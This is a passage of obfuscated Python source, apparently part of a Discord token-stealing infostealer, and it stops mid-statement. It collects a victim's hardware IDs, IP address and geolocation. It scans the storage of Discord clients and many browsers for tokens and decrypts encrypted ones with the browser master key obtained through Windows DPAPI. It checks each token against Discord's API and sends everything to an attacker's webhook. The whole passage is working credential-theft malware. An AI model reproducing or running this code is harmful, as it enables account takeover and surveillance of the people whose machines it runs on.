Screen Number : {YQCGXLWUVKPPFMSZDMQGGXSXMTUHNZEOXOZXQXEGEPIIHFMYNCVSNBPMAMUXYEWWMIYMDYOFLSQDLFWGWTUIJJD}

HWID : {YUSYQLWHBHNWHQJTUFXEOJQUQBZRPPKGIXMOUZAJTBAGDCYNWTWROLYFPYTVASIVSDDLYRVJAGTJWQTYWJCLBTHGGVL}
MAC  : {EXJZKMPVDPSBUSKZCQAHDWQEKMTUEBWLFGPATVMAPMUZNBRMHSVQBAM}
CPU  : {LCOOSDANXZPKWLUGHFFRSBOCNQOQHAUVSZCIXXRHYOBSPVWGWGIWYNDVIVKJKTPYXHLARPKRPITHTNYHMATYCZNGAEKIE}, {EBLCLGOAQJLIAZOPLDCPHGYZPMNOYHPHXGPUHSCWAKIREKIHJULSTHEMLSHLKXKWOFXTOTR} Core
GPU  : {NQJMGPDURFSEGCTNTENJIXWSPTKGTIVKZTTVXYKZLWUFXZJDQTHBWNDWVCFXLDMYTGCMIEQLEMQHCGYJINFWNRAZE}
RAM  : {SJIVOPZAOJTIEUMWXZYGCVBRXSJGFCJFFOHIFHKYUGVGBGNZZXGJOSCVHVBULWQSBNQSOOMNJYNMMMFIJ}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS}
Local  : {FSKPVSBHJWUBXNVMQKGKOYOOITRXBKDEYDGIFCCMFPNGXQUMJSSKTRQUXGDXCRM}
Isp    : {KKFJQILNLQLKAOLXGABVHJMXHWTJKNHALFWEHGBGSQAJHGQXYOIF}
Org    : {CEILCRYBFZNMTIZFKKXOLYDXFISTNWRTLHCVQWOFECDSEOLITOVNAJEJVWXPJEIGICUVKNMHYLXLVREJTTNRC}
As     : {HZHLOPDOOLZEORVXFQJUQNDHQFEJFWZFMRERGCWBENICHJHKPZRMUFEGRHYYXEEQMZEIKZBKNUYM}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{LVBQKEFVBFPQPHSHSCKPUYDCLUTYWTKSUJJQWCCHFNLTASUGPSGIONRIBQ}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {THZZZVNEVLHSHXJNNWENBVVMUWKXMNVNHZMONVUFTQEISDKAUASOEVTPPVBTIXIPELQQRORXAPJZADSQMUS} ({THZZZVNEVLHSHXJNNWENBVVMUWKXMNVNHZMONVUFTQEISDKAUASOEVTPPVBTIXIPELQQRORXAPJZADSQMUS_code})
Region    : {UDDHJTEWMPRYODHREEIWXVZGXCEYGOSKIZBGOVVVQMVZCOQRTOHJKETX} ({UDDHJTEWMPRYODHREEIWXVZGXCEYGOSKIZBGOVVVQMVZCOQRTOHJKETX_code})
Zip       : {JQIBDKWWEYNDHPFAWOAHVLLUKPOGHUUOMCLUXYMBXEYLJORXWEJWATCEWOGVTGEWTXSJIBKHNHOBZI}
City      : {WKHTMOQTYZAQLSQWGECPUQXBYTUJPLWFNVPGFXLJZZHQGBMUBXIZHUKOPJVREMFYZIBRSLOUZLZUSGHLMLULKUHAQPZVDOUNIR}
Timezone  : {IJIRZIBZWAWJRBNSRKWCASAAGEHADBYRZJVHFBTSCRXEQFCKVGVAHZNWANTJOXALGTFVMQGFPTGWSVWRJGGHCILLOZPDF}
Latitude  : {OOUUPSVCJCGORYWJTKHUZEEPHXKNAJMILPBNUPLCJLUKQOMXKWAZNSGKMNCWIQYWUSNCWFXVX}
Longitude : {JLUHHRXHDURVIUNZMYEQOHVOQSGBHCHELRJPQDCBWVQRSTRLCGRFHRTYJIIDFROZEDAWSFBXIDQFBTVKXSENWPRQOZNVED}```""", inline=False)

    embed.set_footer(text=CCSVHPAVPVWFHDMNWIECAIKJKTEBVENVWINJUCIWZLBDPZILRQYSGFRURVFU, icon_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD)

    w3bh00k = SyncWebhook.from_url(KYWRKCWTNYORVMKYODCDUCGZRBRRVKCOPUZXBPTUYZQXMHLNOXIRFBJTFTJZYXLIEWUUAF)
    w3bh00k.send(embed=embed, username=NKLPZURQIDGDUWYJSAKOWUZGLVZXGZSKCTGHMBPUYWTMBUGKIYYIXOBVXIKF, avatar_url=GDLKUEUTUBBDFVHYGPJKLAHSYXUITHAWVCFGWSQJDBLJZOFWLEVSXKOTKRAOMD)

def Di5c0rd_T0k3n():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from Cryptodome.Protocol.KDF import scrypt
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def extr4ct_t0k3n5():
        IAKOLCJTCFVAUOTXGCRODKIFXOWJOKIONJVJMHYVNKOHEWSWVVFBZBVOWTDEUUKFQGYFWPM = "https://discord.com/api/v9/users/@me"
        UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ = os.getenv("localappdata")
        GCWIPHKGADBARXQBHOXOYYRNSLHVTLMLWRKJSZEKLFWDDWMDKMBCPPGAXCUXSHTANBAVPTOKRWWKGMNGEBGMBKPVEYHF = os.getenv("appdata")
        UADFTVGPAALDBONUBWTWYGOEUCMCJDUNJLUPRJMMADKOONYJWYTEYLDONOCXIWNCVLVYRJENTXPYRDZOAXF = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        UADFTVGPAALDBONUBWTWYGOEUCMCJDUNJLUPRJMMADKOONYJWYTEYLDONOCXIWNCVLVYRJENTXPYRDZOAXF_enc = r"dQw4w9WgXcQ:[^\"]*"
        SZRMZNEALHDWODNSYYWYLMGETLRFNKOFPALGXFWLFDZLNKFEHSGJKKOWKPJAHUTHMWDUBCWQSJFQUJLXGAWHRXCKPBCHHUAK = []
        GKXCZRIAXXBLYZTCRBROJCMYATBOHPNEMECADHWKGRWNGDJEXXOOHCFCVUOZHFJGUSEPBQASKCJHUJNKZDEBHWIWJEVQOCCERPUI = []
        TNAAEYHPRJPXJRBYRSWGNLCLMJXCTGKOQSVAWMJOMIGRVPONRYFCJSTIYWWILXQYZDPZUQAZYK = {}

        WOGQUUHWUUHUONPXOYPLECSYKGCLGUKDFYHJZLQLRBWWRQCIWQAUXVXDQXHAAIWOGMRHOTXMVY = {
            'Discord': GCWIPHKGADBARXQBHOXOYYRNSLHVTLMLWRKJSZEKLFWDDWMDKMBCPPGAXCUXSHTANBAVPTOKRWWKGMNGEBGMBKPVEYHF + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': GCWIPHKGADBARXQBHOXOYYRNSLHVTLMLWRKJSZEKLFWDDWMDKMBCPPGAXCUXSHTANBAVPTOKRWWKGMNGEBGMBKPVEYHF + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': GCWIPHKGADBARXQBHOXOYYRNSLHVTLMLWRKJSZEKLFWDDWMDKMBCPPGAXCUXSHTANBAVPTOKRWWKGMNGEBGMBKPVEYHF + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': GCWIPHKGADBARXQBHOXOYYRNSLHVTLMLWRKJSZEKLFWDDWMDKMBCPPGAXCUXSHTANBAVPTOKRWWKGMNGEBGMBKPVEYHF + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': GCWIPHKGADBARXQBHOXOYYRNSLHVTLMLWRKJSZEKLFWDDWMDKMBCPPGAXCUXSHTANBAVPTOKRWWKGMNGEBGMBKPVEYHF + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': GCWIPHKGADBARXQBHOXOYYRNSLHVTLMLWRKJSZEKLFWDDWMDKMBCPPGAXCUXSHTANBAVPTOKRWWKGMNGEBGMBKPVEYHF + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': UMUJAFCGTYEXWOUSIIRQWFEVKWUMXEDSFLQFWTVTQJJSKRZLJWOQUDTVFEPZKBJOHNMYJZLBOEFCGDYKLGXJKLMUZ + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR, LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR in WOGQUUHWUUHUONPXOYPLECSYKGCLGUKDFYHJZLQLRBWWRQCIWQAUXVXDQXHAAIWOGMRHOTXMVY.items():
            if not os.path.exists(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR):
                continue
            OODXCATDMEYBMZWWSXJQADYUVQTGZAGUOILZBVYLWQZBSTLCJSKXLOISIWOCBEGJGPLIHJWNDHGOXDEGATQEBZNEYQ = VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR.replace(" ", "").lower()
            if "cord" in LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR:
                if not os.path.exists(GCWIPHKGADBARXQBHOXOYYRNSLHVTLMLWRKJSZEKLFWDDWMDKMBCPPGAXCUXSHTANBAVPTOKRWWKGMNGEBGMBKPVEYHF + f'\\{OODXCATDMEYBMZWWSXJQADYUVQTGZAGUOILZBVYLWQZBSTLCJSKXLOISIWOCBEGJGPLIHJWNDHGOXDEGATQEBZNEYQ}\\Local State'):
                    continue
                for v4r_file_name in os.listdir(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for y in re.findall(UADFTVGPAALDBONUBWTWYGOEUCMCJDUNJLUPRJMMADKOONYJWYTEYLDONOCXIWNCVLVYRJENTXPYRDZOAXF_enc, v4r_line.strip()):
                                SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(GCWIPHKGADBARXQBHOXOYYRNSLHVTLMLWRKJSZEKLFWDDWMDKMBCPPGAXCUXSHTANBAVPTOKRWWKGMNGEBGMBKPVEYHF + f'\\{OODXCATDMEYBMZWWSXJQADYUVQTGZAGUOILZBVYLWQZBSTLCJSKXLOISIWOCBEGJGPLIHJWNDHGOXDEGATQEBZNEYQ}\\Local State'))
                                if validate_t0k3n(SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW, IAKOLCJTCFVAUOTXGCRODKIFXOWJOKIONJVJMHYVNKOHEWSWVVFBZBVOWTDEUUKFQGYFWPM):
                                    TTUYSXORDEXXUFGMJPITWTZXNCSTPFUFNXLEJBOOBUBFQVHEYASUMKEMIXBRXWVF = requests.get(IAKOLCJTCFVAUOTXGCRODKIFXOWJOKIONJVJMHYVNKOHEWSWVVFBZBVOWTDEUUKFQGYFWPM, headers={'Authorization': SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW}).json()['id']
                                    if TTUYSXORDEXXUFGMJPITWTZXNCSTPFUFNXLEJBOOBUBFQVHEYASUMKEMIXBRXWVF not in GKXCZRIAXXBLYZTCRBROJCMYATBOHPNEMECADHWKGRWNGDJEXXOOHCFCVUOZHFJGUSEPBQASKCJHUJNKZDEBHWIWJEVQOCCERPUI:
                                        SZRMZNEALHDWODNSYYWYLMGETLRFNKOFPALGXFWLFDZLNKFEHSGJKKOWKPJAHUTHMWDUBCWQSJFQUJLXGAWHRXCKPBCHHUAK.append(SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW)
                                        GKXCZRIAXXBLYZTCRBROJCMYATBOHPNEMECADHWKGRWNGDJEXXOOHCFCVUOZHFJGUSEPBQASKCJHUJNKZDEBHWIWJEVQOCCERPUI.append(TTUYSXORDEXXUFGMJPITWTZXNCSTPFUFNXLEJBOOBUBFQVHEYASUMKEMIXBRXWVF)
                                        TNAAEYHPRJPXJRBYRSWGNLCLMJXCTGKOQSVAWMJOMIGRVPONRYFCJSTIYWWILXQYZDPZUQAZYK[SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW] = (VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR, f"{LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR}\\{v4r_file_name}")
            else:
                for v4r_file_name in os.listdir(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR):
                    if v4r_file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR}\\{v4r_file_name}', errors='ignore') as v4r_file:
                        for v4r_line in v4r_file:
                            for SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW in re.findall(UADFTVGPAALDBONUBWTWYGOEUCMCJDUNJLUPRJMMADKOONYJWYTEYLDONOCXIWNCVLVYRJENTXPYRDZOAXF, v4r_line.strip()):
                                if validate_t0k3n(SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW, IAKOLCJTCFVAUOTXGCRODKIFXOWJOKIONJVJMHYVNKOHEWSWVVFBZBVOWTDEUUKFQGYFWPM):
                                    TTUYSXORDEXXUFGMJPITWTZXNCSTPFUFNXLEJBOOBUBFQVHEYASUMKEMIXBRXWVF = requests.get(IAKOLCJTCFVAUOTXGCRODKIFXOWJOKIONJVJMHYVNKOHEWSWVVFBZBVOWTDEUUKFQGYFWPM, headers={'Authorization': SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW}).json()['id']
                                    if TTUYSXORDEXXUFGMJPITWTZXNCSTPFUFNXLEJBOOBUBFQVHEYASUMKEMIXBRXWVF not in GKXCZRIAXXBLYZTCRBROJCMYATBOHPNEMECADHWKGRWNGDJEXXOOHCFCVUOZHFJGUSEPBQASKCJHUJNKZDEBHWIWJEVQOCCERPUI:
                                        SZRMZNEALHDWODNSYYWYLMGETLRFNKOFPALGXFWLFDZLNKFEHSGJKKOWKPJAHUTHMWDUBCWQSJFQUJLXGAWHRXCKPBCHHUAK.append(SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW)
                                        GKXCZRIAXXBLYZTCRBROJCMYATBOHPNEMECADHWKGRWNGDJEXXOOHCFCVUOZHFJGUSEPBQASKCJHUJNKZDEBHWIWJEVQOCCERPUI.append(TTUYSXORDEXXUFGMJPITWTZXNCSTPFUFNXLEJBOOBUBFQVHEYASUMKEMIXBRXWVF)
                                        TNAAEYHPRJPXJRBYRSWGNLCLMJXCTGKOQSVAWMJOMIGRVPONRYFCJSTIYWWILXQYZDPZUQAZYK[SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW] = (VQZGUOICLHROFTNCDXPXEQAYVLNDJLZSUMRMLRDOMBNLIAKKMREKUZOJEREEZR, f"{LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR}\\{v4r_file_name}")

        if os.path.exists(GCWIPHKGADBARXQBHOXOYYRNSLHVTLMLWRKJSZEKLFWDDWMDKMBCPPGAXCUXSHTANBAVPTOKRWWKGMNGEBGMBKPVEYHF + "\\Mozilla\\Firefox\\Profiles"):
            for LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR, _, v4r_files in os.walk(GCWIPHKGADBARXQBHOXOYYRNSLHVTLMLWRKJSZEKLFWDDWMDKMBCPPGAXCUXSHTANBAVPTOKRWWKGMNGEBGMBKPVEYHF + "\\Mozilla\\Firefox\\Profiles"):
                for v4r__file in v4r_files:
                    if v4r__file.endswith('.sqlite'):
                        with open(f'{LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR}\\{v4r__file}', errors='ignore') as v4r_file:
                            for v4r_line in v4r_file:
                                for SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW in re.findall(UADFTVGPAALDBONUBWTWYGOEUCMCJDUNJLUPRJMMADKOONYJWYTEYLDONOCXIWNCVLVYRJENTXPYRDZOAXF, v4r_line.strip()):
                                    if validate_t0k3n(SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW, IAKOLCJTCFVAUOTXGCRODKIFXOWJOKIONJVJMHYVNKOHEWSWVVFBZBVOWTDEUUKFQGYFWPM):
                                        TTUYSXORDEXXUFGMJPITWTZXNCSTPFUFNXLEJBOOBUBFQVHEYASUMKEMIXBRXWVF = requests.get(IAKOLCJTCFVAUOTXGCRODKIFXOWJOKIONJVJMHYVNKOHEWSWVVFBZBVOWTDEUUKFQGYFWPM, headers={'Authorization': SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW}).json()['id']
                                        if TTUYSXORDEXXUFGMJPITWTZXNCSTPFUFNXLEJBOOBUBFQVHEYASUMKEMIXBRXWVF not in GKXCZRIAXXBLYZTCRBROJCMYATBOHPNEMECADHWKGRWNGDJEXXOOHCFCVUOZHFJGUSEPBQASKCJHUJNKZDEBHWIWJEVQOCCERPUI:
                                            SZRMZNEALHDWODNSYYWYLMGETLRFNKOFPALGXFWLFDZLNKFEHSGJKKOWKPJAHUTHMWDUBCWQSJFQUJLXGAWHRXCKPBCHHUAK.append(SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW)
                                            GKXCZRIAXXBLYZTCRBROJCMYATBOHPNEMECADHWKGRWNGDJEXXOOHCFCVUOZHFJGUSEPBQASKCJHUJNKZDEBHWIWJEVQOCCERPUI.append(TTUYSXORDEXXUFGMJPITWTZXNCSTPFUFNXLEJBOOBUBFQVHEYASUMKEMIXBRXWVF)
                                            TNAAEYHPRJPXJRBYRSWGNLCLMJXCTGKOQSVAWMJOMIGRVPONRYFCJSTIYWWILXQYZDPZUQAZYK[SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW] = ('Firefox', f"{LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR}\\{v4r__file}")
        return SZRMZNEALHDWODNSYYWYLMGETLRFNKOFPALGXFWLFDZLNKFEHSGJKKOWKPJAHUTHMWDUBCWQSJFQUJLXGAWHRXCKPBCHHUAK, TNAAEYHPRJPXJRBYRSWGNLCLMJXCTGKOQSVAWMJOMIGRVPONRYFCJSTIYWWILXQYZDPZUQAZYK

    def validate_t0k3n(SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW, IAKOLCJTCFVAUOTXGCRODKIFXOWJOKIONJVJMHYVNKOHEWSWVVFBZBVOWTDEUUKFQGYFWPM):
        return requests.get(IAKOLCJTCFVAUOTXGCRODKIFXOWJOKIONJVJMHYVNKOHEWSWVVFBZBVOWTDEUUKFQGYFWPM, headers={'Authorization': SUMCARWFJCJNIRUPOYJPEFKQZTNTGOPINPMOTEVKIXNKDBVGKGSFMDYTMUZQEIYTTUNSBVTOGTTZRMOYW}).status_code == 200

    def decrypt_val(AMTBDYSAUASSJJILCFVGMAMKZSZLTRQLBNLFUVVUWFOKYMRWCLMYIURRFHSTGRUBBAREIMYSSZXLNYHEXJ, v4r_master_key):
        v4r_iv = AMTBDYSAUASSJJILCFVGMAMKZSZLTRQLBNLFUVVUWFOKYMRWCLMYIURRFHSTGRUBBAREIMYSSZXLNYHEXJ[3:15]
        v4r_payload = AMTBDYSAUASSJJILCFVGMAMKZSZLTRQLBNLFUVVUWFOKYMRWCLMYIURRFHSTGRUBBAREIMYSSZXLNYHEXJ[15:]
        v4r_cipher = AES.new(v4r_master_key, AES.MODE_GCM, v4r_iv)
        return v4r_cipher.decrypt(v4r_payload)[:-16].decode()

    def get_master_key(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR):
        if not os.path.exists(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR):
            return None
        with open(LQJWEHPRYLGOGINABNNXGNZYTOPYHMBSOEMWRRBIBTWSUOPGQZWLUWOYZFSYCKAUVDMQPEHMGDGQYNAOR, "r", encoding="utf-8") as v4r_f:
            v4r_local_state = json.load(v4r_f)
        v4r_master_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(v4r_master_key, None, None, None, 0)[1]

    def upload_t0k3n5():
        SZRMZNEALHDWODNSYYWYLMGETLRFNKOFPALGXFWLFDZLNKFEHSGJKKOWKPJAHUTHMWDUBCWQSJFQUJLXGAWHRXCKPBCHHUAK, TNAAEYHPRJPXJRBYRSWGNLCLMJXCTGKOQSVAWMJOMIGRVPONRYFCJSTIYWWILXQYZDPZUQAZYK = extr4ct_t0k3n5()
        CTBOBCCKPJZKBEIWPYOETWWMSUVZNAVJZOLCSNWFVSDIPMHJBEPXHVPPZUWQUEQFLDIKNOGRE = SyncWebhook.from_url(KYWRKCWTNYORVMKYODCDUCGZRBRRVKCOPUZXBPTUYZQXMHLNOXIRFBJTFTJZYXLIEWUUAF)

        if not SZRMZNEALHDWODNSYYWYLMGETLRFNKOFPALGXFWLFDZLNKFEHSGJKKOWKPJAHUTHMWDUBCWQSJFQUJLXGAWHRXCKPBCHHUAK:
            NAXWOFLVWWSGQAPJVXFXEAWLTCBERBZPXIXEKIWQRYOIGICVKMWTZMSVISEWEV = Embed(
                title=f'Discord Token `{WTIYHAKDXEVXXVAAXMFENAIACISDJHAADPAKNOVZGBDLHEJRXDRSMATTHVUZXXBNDVLPLQMWTNFMQZNZ} "{ITZONLUPHVTTZUHXNLJBCSEIHBQABMKCHMBDLIFDKDVHDLUVBRQJNMWJQUKHULMGXBS}"`:', 
                description=f"No discord tokens found.",
